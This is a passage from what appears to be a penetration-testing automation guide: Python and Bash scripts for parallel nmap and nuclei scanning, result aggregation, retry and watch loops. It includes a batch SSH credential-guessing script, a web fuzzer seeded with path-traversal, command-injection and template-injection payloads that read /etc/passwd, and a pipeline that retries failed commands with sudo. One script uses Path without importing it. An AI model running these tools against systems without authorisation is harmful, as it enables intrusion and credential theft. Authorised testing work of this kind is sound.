        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {}
            for target in targets:
                future = executor.submit(self._run_command, target, command_template)
                futures[future] = target
                time.sleep(1.0 / self.rate_limit)  # Rate limit

            for future in as_completed(futures):
                target = futures[future]
                result = future.result()
                status = "OK" if result.get("success") else "FAIL"
                print(f"[PARALLEL] {target}: {status}")

        return sorted(self.results, key=lambda x: x.get("target", ""))

# Usage
scanner = ParallelScanner(max_workers=5, rate_limit_per_sec=2)
targets = [f"192.168.1.{i}" for i in range(1, 51)]
results = scanner.scan_targets(targets, "nmap -sV -T4 --top-ports 100 {target}")
print(f"Scanned {len(results)} targets")
```

---

## 18. Result Aggregation Scripts

### Multi-Tool Result Normalizer

```python
#!/usr/bin/env python3
"""Aggregate and normalize results from multiple scanning tools into a unified schema."""

import json
import xml.etree.ElementTree as ET
from pathlib import Path
from datetime import datetime

def normalize_nmap(xml_path):
    """Parse Nmap XML output into normalized findings."""
    tree = ET.parse(xml_path)
    findings = []
    for host in tree.iter('host'):
        addr = host.find('address').get('addr')
        for port in host.iter('port'):
            state = port.find('state').get('state')
            if state == 'open':
                svc = port.find('service')
                findings.append({
                    'source': 'nmap',
                    'host': addr,
                    'port': int(port.get('portid')),
                    'protocol': port.get('protocol'),
                    'service': svc.get('name', '') if svc is not None else '',
                    'version': svc.get('version', '') if svc is not None else '',
                    'timestamp': datetime.utcnow().isoformat()
                })
    return findings

def normalize_nuclei(json_path):
    """Parse Nuclei JSON output into normalized findings."""
    findings = []
    with open(json_path) as f:
        for line in f:
            if line.strip():
                data = json.loads(line)
                findings.append({
                    'source': 'nuclei',
                    'template': data.get('template-id', ''),
                    'severity': data.get('info', {}).get('severity', ''),
                    'host': data.get('host', ''),
                    'matched_at': data.get('matched-at', ''),
                    'timestamp': data.get('timestamp', '')
                })
    return findings

def aggregate_results(evidence_dir):
    """Aggregate all scan results into a single normalized dataset."""
    all_findings = []
    for xml_file in Path(evidence_dir).glob('*.xml'):
        all_findings.extend(normalize_nmap(str(xml_file)))
    for json_file in Path(evidence_dir).glob('*.json'):
        all_findings.extend(normalize_nuclei(str(json_file)))

    report = {
        'generated_at': datetime.utcnow().isoformat(),
        'total_findings': len(all_findings),
        'sources': list(set(f['source'] for f in all_findings)),
        'unique_hosts': list(set(f.get('host', '') for f in all_findings)),
        'findings': all_findings
    }

    output_path = f"{evidence_dir}/aggregated_results.json"
    with open(output_path, 'w') as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[AGGREGATE] {len(all_findings)} findings from {report['sources']} saved to {output_path}")
    return report

# Usage: aggregate_results("evidence/pipeline-20260610")
```

### Statistical Report from Loop Execution

```python
#!/usr/bin/env python3
"""Generate statistical report from autonomous loop execution logs."""

import json
from collections import Counter, defaultdict
from datetime import datetime

def generate_loop_report(log_dir):
    """Parse execution logs and generate statistics."""
    all_iterations = []
    for log_file in Path(log_dir).glob('*.json'):
        with open(log_file) as f:
            data = json.load(f)
            if isinstance(data, list):
                all_iterations.extend(data)
            elif 'results' in data:
                all_iterations.extend(data['results'])

    if not all_iterations:
        print("[REPORT] No iteration data found")
        return

    total = len(all_iterations)
    successful = sum(1 for i in all_iterations if i.get('success'))
    failed = total - successful
    tools_used = Counter(i.get('tool', 'unknown') for i in all_iterations)
    error_types = Counter(
        i.get('error_type', 'unknown') for i in all_iterations if not i.get('success')
    )
    by_target = defaultdict(lambda: {'total': 0, 'success': 0, 'failed': 0})
    for i in all_iterations:
        target = i.get('target', 'unknown')
        by_target[target]['total'] += 1
        if i.get('success'):
            by_target[target]['success'] += 1
        else:
            by_target[target]['failed'] += 1

    report = f"""# Autonomous Loop Execution Report
Generated: {datetime.utcnow().isoformat()}

## Summary
- Total iterations: {total}
- Successful: {successful} ({successful/total*100:.1f}%)
- Failed: {failed} ({failed/total*100:.1f}%)

## Tools Used
"""
    for tool, count in tools_used.most_common():
        report += f"- {tool}: {count} iterations\n"

    report += "\n## Error Breakdown\n"
    for err, count in error_types.most_common():
        report += f"- {err}: {count}\n"

    report += "\n## Per-Target Results\n"
    for target, stats in sorted(by_target.items()):
        report += f"- {target}: {stats['success']}/{stats['total']} successful\n"

    print(report)
    return report
```

---

## 19. Error Recovery Patterns

### Automatic Retry with Circuit Breaker

```python
#!/usr/bin/env python3
"""Circuit breaker pattern for autonomous operations — stops calling failing services."""

import time
from enum import Enum
from dataclasses import dataclass, field

class CircuitState(Enum):
    CLOSED = "closed"      # Normal operation
    OPEN = "open"          # Failing, reject calls
    HALF_OPEN = "half_open"  # Testing recovery

@dataclass
class CircuitBreaker:
    name: str
    failure_threshold: int = 5
    recovery_timeout: float = 30.0
    state: CircuitState = CircuitState.CLOSED
    failure_count: int = 0
    last_failure_time: float = 0.0
    success_count: int = 0
    history: list = field(default_factory=list)

    def call(self, func, *args, **kwargs):
        """Execute function through the circuit breaker."""
        if self.state == CircuitState.OPEN:
            if time.time() - self.last_failure_time > self.recovery_timeout:
                self.state = CircuitState.HALF_OPEN
                print(f"[CIRCUIT-{self.name}] State: OPEN -> HALF_OPEN (testing recovery)")
            else:
                raise Exception(f"Circuit {self.name} is OPEN — rejecting call")

        try:
            result = func(*args, **kwargs)
            self._on_success()
            return result
        except Exception as e:
            self._on_failure()
            raise

    def _on_success(self):
        self.failure_count = 0
        self.success_count += 1
        if self.state == CircuitState.HALF_OPEN:
            self.state = CircuitState.CLOSED
            print(f"[CIRCUIT-{self.name}] State: HALF_OPEN -> CLOSED (recovered)")

    def _on_failure(self):
        self.failure_count += 1
        self.last_failure_time = time.time()
        if self.failure_count >= self.failure_threshold:
            self.state = CircuitState.OPEN
            print(f"[CIRCUIT-{self.name}] State: CLOSED -> OPEN ({self.failure_count} failures)")

# Usage: Protect nmap scans with circuit breaker
# cb = CircuitBreaker("nmap-scan", failure_threshold=3, recovery_timeout=60)
# result = cb.call(subprocess.run, ["nmap", "-sV", target], capture_output=True, text=True)
```

### Self-Healing Pipeline

```bash
#!/usr/bin/env bash
# Self-healing pipeline that detects failures and applies automatic remediation
# Types of self-healing: retry, skip, alternative tool, reduced scope

TARGET="$1"
MAX_RETRIES=2
OUTPUT_DIR="evidence/selfheal-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"

run_with_healing() {
  local phase="$1"
  shift
  local attempts=0

  while [ $attempts -le $MAX_RETRIES ]; do
    attempts=$((attempts + 1))
    echo "[SELF-HEAL] $phase attempt $attempts/$((MAX_RETRIES + 1))"

    output=$("$@" 2>&1)
    exit_code=$?

    if [ $exit_code -eq 0 ]; then
      echo "$output" >> "$OUTPUT_DIR/${phase}-success.log"
      echo "[SELF-HEAL] $phase succeeded on attempt $attempts"
      return 0
    fi

    echo "$output" >> "$OUTPUT_DIR/${phase}-failed.log"

    # Analyze failure and apply healing strategy
    if echo "$output" | grep -qi "connection refused\|timed out"; then
      echo "[SELF-HEAL] $phase: Network error — waiting 10s before retry"
      sleep 10
    elif echo "$output" | grep -qi "rate limit\|429\|throttl"; then
      echo "[SELF-HEAL] $phase: Rate limited — doubling wait time"
      sleep $((5 * 2 ** attempts))
    elif echo "$output" | grep -qi "permission denied\|access denied"; then
      echo "[SELF-HEAL] $phase: Permission error — trying with sudo"
      sudo "$@"
      return $?
    else
      echo "[SELF-HEAL] $phase: Unknown error — skipping"
      return 1
    fi
  done

  echo "[SELF-HEAL] $phase: All $attempts attempts failed"
  return 1
}

# Run pipeline phases with self-healing
run_with_healing "recon" nmap -sn -n "$TARGET"
run_with_healing "scan" nmap -sV -T4 --top-ports 100 "$TARGET"
run_with_healing "vuln" nmap --script vuln -p 22,80,443 "$TARGET"
```

---

## 20. Watch Loop Pattern Scripts

### HTTP Response Monitor with Threshold Alerting

```bash
#!/usr/bin/env bash
# Monitor HTTP response time and alert when exceeding threshold
# Polling: 3s interval, max 2000 iterations

TARGET_URL="http://target.local/api/health"
RESPONSE_THRESHOLD_MS=5000
MAX_ITER=2000
POLL_INTERVAL=3
LOG_FILE="evidence/http-monitor-$(date +%Y%m%d).log"

for i in $(seq 1 "$MAX_ITER"); do
  RESPONSE_TIME=$(curl -s -o /dev/null -w "%{time_total}" "$TARGET_URL" 2>/dev/null)
  RESPONSE_MS=$(echo "$RESPONSE_TIME * 1000" | bc 2>/dev/null || echo "0")
  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL" 2>/dev/null)

  if [ "$(echo "$RESPONSE_MS > $RESPONSE_THRESHOLD_MS" | bc 2>/dev/null)" -eq 1 ]; then
    echo "[$(date -Iseconds)] [SLOW] ${RESPONSE_MS}ms (threshold: ${RESPONSE_THRESHOLD_MS}ms) HTTP $HTTP_CODE" | tee -a "$LOG_FILE"
  fi

  if [ "$HTTP_CODE" = "500" ] || [ "$HTTP_CODE" = "502" ] || [ "$HTTP_CODE" = "503" ]; then
    echo "[$(date -Iseconds)] [ERROR] HTTP $HTTP_CODE from $TARGET_URL" | tee -a "$LOG_FILE"
  fi

  sleep "$POLL_INTERVAL"
done
```

### DNS Change Detection Watch Loop

```bash
#!/usr/bin/env bash
# Monitor DNS records for changes indicating infrastructure modification
# Trigger: DNS record value differs from baseline

DOMAIN="target.example.com"
RECORD_TYPES=("A" "AAAA" "MX" "TXT" "NS")
BASELINE_FILE="evidence/dns-baseline-$(date +%Y%m%d).txt"
MAX_ITER=5000
POLL_INTERVAL=30

echo "[WATCH] DNS monitor starting for $DOMAIN"

# Capture baseline
for rt in "${RECORD_TYPES[@]}"; do
  echo "$rt:$(dig +short "$DOMAIN" "$rt" @8.8.8.8 2>/dev/null | sort | tr '\n' ',')" >> "$BASELINE_FILE"
done

for i in $(seq 1 "$MAX_ITER"); do
  for rt in "${RECORD_TYPES[@]}"; do
    current=$(dig +short "$DOMAIN" "$rt" @8.8.8.8 2>/dev/null | sort | tr '\n' ',')
    baseline=$(grep "^${rt}:" "$BASELINE_FILE" | cut -d: -f2-)

    if [ "$current" != "$baseline" ] && [ -n "$baseline" ]; then
      echo "[$(date -Iseconds)] [TRIGGER] DNS $rt changed for $DOMAIN" | tee -a "evidence/dns-changes-$(date +%Y%m%d).log"
      echo "  Before: $baseline" | tee -a "evidence/dns-changes-$(date +%Y%m%d).log"
      echo "  After:  $current" | tee -a "evidence/dns-changes-$(date +%Y%m%d).log"
      # Update baseline
      sed -i "s/^${rt}:.*/${rt}:${current}/" "$BASELINE_FILE"
    fi
  done

  sleep "$POLL_INTERVAL"
done
```

---

## 21. Batch Processing Automation

### Parallel Nuclei Scan with Result Aggregation

```bash
#!/usr/bin/env bash
# Batch Nuclei vulnerability scanning with parallel execution and result merging
# Rate: 5 concurrent, 1s delay between targets

TARGETS_FILE="targets.txt"
OUTPUT_DIR="evidence/nuclei-batch-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"
CONCURRENCY=5
BATCH_DELAY=1
TOTAL=$(wc -l < "$TARGETS_FILE")

echo "[BATCH] Starting Nuclei scan on $TOTAL targets (concurrency: $CONCURRENCY)"

COUNT=0
while IFS= read -r target; do
  COUNT=$((COUNT + 1))
  SAFE_NAME=$(echo "$target" | sed 's|[^a-zA-Z0-9.]|_|g')

  nuclei -u "$target" -t cves/ -t vulnerabilities/ -t misconfiguration/ \
    -severity critical,high,medium -silent -json \
    -o "$OUTPUT_DIR/nuclei-${SAFE_NAME}.json" 2>/dev/null &

  if [ $((COUNT % CONCURRENCY)) -eq 0 ]; then
    wait
    echo "[BATCH] Processed $COUNT/$TOTAL targets"
    sleep "$BATCH_DELAY"
  fi
done < "$TARGETS_FILE"

wait

# Merge all results into single file
cat "$OUTPUT_DIR"/*.json 2>/dev/null > "$OUTPUT_DIR/merged_results.json"
TOTAL_FINDINGS=$(jq -s 'length' "$OUTPUT_DIR/merged_results.json" 2>/dev/null || echo "0")
echo "[BATCH] Complete: $COUNT targets scanned, $TOTAL_FINDINGS total findings"
```

### Batch SSH Credential Testing

```bash
#!/usr/bin/env bash
# Batch SSH credential testing with rate limiting and lockout detection
# Rate: 1 attempt per target per 3 seconds, lockout detection enabled

TARGETS_FILE="ssh_targets.txt"
CREDS_FILE="creds.txt"
OUTPUT_DIR="evidence/ssh-batch-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"
DELAY=3
MAX_FAILURES_PER_TARGET=5

echo "[BATCH-SSH] Starting credential testing on $(wc -l < "$TARGETS_FILE") targets"

while IFS= read -r target; do
  FAILURE_COUNT=0
  SUCCESS=false

  while IFS=: read -r user pass; do
    [ "$FAILURE_COUNT" -ge "$MAX_FAILURES_PER_TARGET" ] && break
    [ "$SUCCESS" = true ] && break

    result=$(timeout 10 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$target" "echo SUCCESS" 2>&1)

    if echo "$result" | grep -q "SUCCESS"; then
      echo "[$(date -Iseconds)] [SSH-SUCCESS] $user:$pass @ $target" | tee -a "$OUTPUT_DIR/success.log"
      SUCCESS=true
    else
      FAILURE_COUNT=$((FAILURE_COUNT + 1))
    fi

    sleep "$DELAY"
  done < "$CREDS_FILE"

  echo "[$(date -Iseconds)] [SSH] $target complete (failures: $FAILURE_COUNT, success: $SUCCESS)"
done < "$TARGETS_FILE"
```

---

## 22. Learning Cycle Implementation

### Adaptive Web Fuzzer with Response Learning

```python
#!/usr/bin/env python3
"""Adaptive web fuzzer that learns from HTTP responses to refine payloads."""

import requests
import time
from urllib.parse import urljoin
from collections import defaultdict

class AdaptiveWebFuzzer:
    def __init__(self, base_url, max_iterations=50, confidence_threshold=0.05):
        self.base_url = base_url
        self.max_iterations = max_iterations
        self.confidence_threshold = confidence_threshold
        self.baseline_length = None
        self.baseline_code = None
        self.findings = []
        self.iteration = 0

    def seed_payloads(self):
        """Generate initial seed payloads for fuzzing."""
        return [
            "'", '"', "<script>alert(1)</script>", "../../../etc/passwd",
            "{{7*7}}", "${7*7}", "<!--#exec cmd='id'-->",
            "1; cat /etc/passwd", "1'|sleep 5", "admin'--",
            "{{config}}", "${T(java.lang.Runtime)}",
            "<img src=x onerror=alert(1)>",
        ]

    def mutate_payload(self, base_payload):
        """Generate mutations of a promising payload."""
        mutations = [
            base_payload.upper(),
            base_payload.lower(),
            base_payload.replace("'", '"'),
            base_payload + ")))",
            base_payload + "--",
            base_payload.replace(" ", "/**/"),
            base_payload.replace(" ", "%09"),
        ]
        return mutations

    def learn_and_fuzz(self, endpoint="/"):
        """Run the adaptive fuzzing loop."""
        url = urljoin(self.base_url, endpoint)

        # Capture baseline
        baseline = requests.get(url, timeout=10)
        self.baseline_length = len(baseline.text)
        self.baseline_code = baseline.status_code
        print(f"[FUZZ] Baseline: {self.baseline_code}, {self.baseline_length} bytes")

        payloads = self.seed_payloads()
        promising = []

        for payload in payloads:
            self.iteration += 1
            if self.iteration > self.max_iterations:
                break

            try:
                resp = requests.get(url, params={"q": payload}, timeout=10)
                is_anomaly = self._detect_anomaly(resp, payload)

                if is_anomaly:
                    promising.append(payload)
                    print(f"[FUZZ] Anomaly at iter {self.iteration}: {payload[:40]} -> {resp.status_code} ({len(resp.text)} bytes)")
                    # Learn from anomaly and generate refined payloads
                    for mutant in self.mutate_payload(payload)[:3]:
                        self.iteration += 1
                        resp2 = requests.get(url, params={"q": mutant}, timeout=10)
                        self._detect_anomaly(resp2, mutant)

            except requests.RequestException:
                pass

            time.sleep(0.2)

        print(f"[FUZZ] Complete: {len(self.findings)} anomalies from {self.iteration} iterations")
        return self.findings

    def _detect_anomaly(self, resp, payload):
        """Detect if response differs significantly from baseline."""
        anomalies = []
        if resp.status_code != self.baseline_code:
            anomalies.append(f"status_code: {resp.status_code} vs {self.baseline_code}")
        if abs(len(resp.text) - self.baseline_length) > 200:
            anomalies.append(f"length: {len(resp.text)} vs {self.baseline_length}")
        if payload.lower() in resp.text.lower():
            anomalies.append("payload_reflected")

        if anomalies:
            self.findings.append({"payload": payload, "anomalies": anomalies})
            return True
        return False

# Usage: AdaptiveWebFuzzer("http://target.local", max_iterations=50).learn_and_fuzz("/search")
```

---

## 23. Error Recovery Patterns

### Pipeline Recovery with Partial Results

```python
#!/usr/bin/env python3
"""Recover a failed pipeline by loading partial results and resuming from failure point."""

import json
import os
from pathlib import Path

class PipelineRecovery:
    def __init__(self, checkpoint_dir="evidence/checkpoints"):
        self.checkpoint_dir = Path(checkpoint_dir)
        self.checkpoint_dir.mkdir(parents=True, exist_ok=True)

    def save_partial_results(self, operation_id, phase, results, targets_remaining):
        """Save partial results from a failed pipeline phase."""
        checkpoint = {
            "operation_id": operation_id,
            "phase": phase,
            "completed_count": len(results),
            "remaining_count": len(targets_remaining),
            "results": results,
            "targets_remaining": targets_remaining,
            "timestamp": __import__('datetime').datetime.utcnow().isoformat()
        }
        path = self.checkpoint_dir / f"{operation_id}_{phase}.json"
        with open(path, 'w') as f:
            json.dump(checkpoint, f, indent=2, default=str)
        print(f"[RECOVERY] Checkpoint saved: {len(results)} completed, {len(targets_remaining)} remaining")

    def load_and_resume(self, operation_id, phase):
        """Load checkpoint and return results + remaining targets."""
        path = self.checkpoint_dir / f"{operation_id}_{phase}.json"
        if not path.exists():
            print("[RECOVERY] No checkpoint found, starting fresh")
            return [], None

        with open(path) as f:
            checkpoint = json.load(f)

        print(f"[RECOVERY] Resuming from checkpoint: {checkpoint['completed_count']} completed, {checkpoint['remaining_count']} remaining")
        return checkpoint["results"], checkpoint["targets_remaining"]

# Usage:
# recovery = PipelineRecovery()
# recovery.save_partial_results("OP-001", "scan", completed_results, remaining_targets)
# completed, remaining = recovery.load_and_resume("OP-001", "scan")
```

---

## 24. Parallel Execution Templates

### Multi-Target Parallel Scanner with Worker Pool

```python
#!/usr/bin/env python3
"""Parallel scanner using multiprocessing Pool for CPU-bound security tasks."""

import subprocess
import json
from multiprocessing import Pool
from functools import partial

def scan_single_target(target, ports="22,80,443,445,3306,8080"):
    """Scan a single target and return structured results."""
    try:
        result = subprocess.run(
            ["nmap", "-sV", "-T4", "-p", ports, "-oX", "-", target],
            capture_output=True, text=True, timeout=120
        )
        return {"target": target, "returncode": result.returncode, "output_length": len(result.stdout)}
    except subprocess.TimeoutExpired:
        return {"target": target, "error": "timeout"}
    except Exception as e:
        return {"target": target, "error": str(e)}

def parallel_scan(targets, workers=10, ports="22,80,443,445,3306,8080"):
    """Scan multiple targets in parallel using process pool."""
    scan_func = partial(scan_single_target, ports=ports)
    results = []

    with Pool(processes=workers) as pool:
        for i, result in enumerate(pool.imap_unordered(scan_func, targets)):
            results.append(result)
            status = "OK" if result.get("returncode") == 0 else "FAIL"
            print(f"[PARALLEL] {i+1}/{len(targets)} {result['target']}: {status}")

    print(f"[PARALLEL] Complete: {len(results)} targets scanned")
    return sorted(results, key=lambda x: x.get("target", ""))

# Usage:
# targets = [f"192.168.1.{i}" for i in range(1, 101)]
# results = parallel_scan(targets, workers=10)
```
